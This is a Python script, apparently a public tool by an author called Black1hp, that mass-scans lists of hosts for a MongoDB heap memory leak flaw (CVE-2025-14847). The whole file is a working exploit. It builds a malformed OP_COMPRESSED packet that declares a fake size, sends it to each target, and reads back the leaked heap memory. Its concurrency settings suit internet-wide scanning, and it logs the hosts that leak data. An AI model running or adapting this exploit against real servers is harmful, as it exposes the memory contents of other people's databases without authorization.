#!/usr/bin/env python3
"""
CVE-2025-14847 - MongoDB Remote Heap Memory Leak Scanner
Author: Black1hp
X: x.com/black1hp
Medium: medium.com/@black1hp
GitHub: github.com/black1hp
"""

import asyncio
import struct
import zlib
import random
import argparse
import os
import sys
from datetime import datetime

# --- Professional Banner ---
BANNER = r"""
  __  __                         ____  _                 _
 |  \/  | ___  _ __   __ _  ___ | __ )| | ___  ___  __| |
 | |\/| |/ _ \| '_ \ / _` |/ _ \|  _ \| |/ _ \/ _ \/ _` |
 | |  | | (_) | | | | (_| | (_) | |_) | |  __/  __/ (_| |
 |_|  |_|\___/|_| |_|\__, |\___/|____/|_|\___|\___|\__,_|
                     |___/      v1.0 - Created by Black1hp
"""

# --- Configuration & Tuning ---
DEFAULT_PORT = 27017
LEAK_SIZE = 65536  # Target leak size (64KB)

def print_banner():
    print("\033[94m" + BANNER + "\033[0m")
    print(f"[*] Author: Black1hp | GitHub: github.com/black1hp")
    print(f"[*] X: x.com/black1hp | Medium: medium.com/@black1hp")
    print("-" * 65)

def build_malformed_packet(leak_size):
    """Constructs the malicious OP_COMPRESSED packet logic."""
    bson_payload = b'\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
    op_query_header = struct.pack('<I', 0) + b'admin.$cmd\x00' + struct.pack('<ii', 0, -1)
    original_msg = op_query_header + bson_payload
    compressed_body = zlib.compress(original_msg)

    op_compressed_data = (
        struct.pack('<I', 2004) +           # originalOpcode: OP_QUERY
        struct.pack('<I', leak_size) +      # MALICIOUS: fake size
        b'\x02' +                           # zlib
        compressed_body
    )

    request_id = random.randint(1000, 9999)
    total_len = 16 + len(op_compressed_data)
    header = struct.pack('<iiii', total_len, request_id, 0, 2012) # 2012: OP_COMPRESSED

    return header + op_compressed_data

async def write_result(target, data_len):
    """Saves vulnerable targets immediately to a file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("vulnerable_targets.txt", "a") as f:
        f.write(f"[{timestamp}] {target} - Leaked: {data_len} bytes\n")

async def scan_target(target, semaphore, timeout):
    """Asynchronous scanning function for a single target."""
    async with semaphore:
        target = target.strip()
        if not target: return

        try:
            # Handle potential port in target string (host:port)
            host = target
            port = DEFAULT_PORT
            if ":" in target:
                host, port = target.split(":")
                port = int(port)

            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )

            packet = build_malformed_packet(LEAK_SIZE)
            writer.write(packet)
            await writer.drain()

            # Read MongoDB Message Header (16 bytes)
            header = await asyncio.wait_for(reader.readexactly(16), timeout=timeout)
            resp_len, _, _, _ = struct.unpack('<iiii', header)

            # Read the leaked data
            leaked_data = await asyncio.wait_for(reader.read(resp_len - 16), timeout=timeout)

            if len(leaked_data) > 1024:
                print(f"\033[92m[+] VULNERABLE: {host}:{port} | Leaked: {len(leaked_data)} bytes\033[0m")
                await write_result(f"{host}:{port}", len(leaked_data))
            else:
                print(f"\033[90m[-] {host}:{port} - Not Vulnerable\033[0m")

            writer.close()
            await writer.wait_closed()

        except Exception:
            # Silent fails for massive scanning to keep output clean
            pass

async def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="High-Performance MongoDB CVE-2025-14847 Scanner",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Concurrency Tuning (Based on Internet Speed):
  - 10 Mbps  -->  -c 20
  - 50 Mbps  -->  -c 100
  - 100 Mbps -->  -c 250
  - 1 Gbps   -->  -c 1000 (Use with caution)
        """
    )
    parser.add_argument("-i", "--input", required=True, help="File containing targets (IPs or Domains)")
    parser.add_argument("-c", "--concurrency", type=int, default=50, help="Number of concurrent scans (default: 50)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Connection timeout in seconds (default: 5)")

    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"[!] Error: File '{args.input}' not found.")
        return

    with open(args.input, "r") as f:
        targets = f.readlines()

    print(f"[*] Loaded {len(targets)} targets.")
    print(f"[*] Concurrency: {args.concurrency} | Timeout: {args.timeout}s")
    print("[*] Scan started at:", datetime.now().strftime("%H:%M:%S"))
    print("-" * 65)

    semaphore = asyncio.Semaphore(args.concurrency)
    tasks = [scan_target(t, semaphore, args.timeout) for t in targets]

    await asyncio.gather(*tasks)
    print("-" * 65)
    print("[*] Scan complete. Check 'vulnerable_targets.txt' for results.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user.")
        sys.exit(0)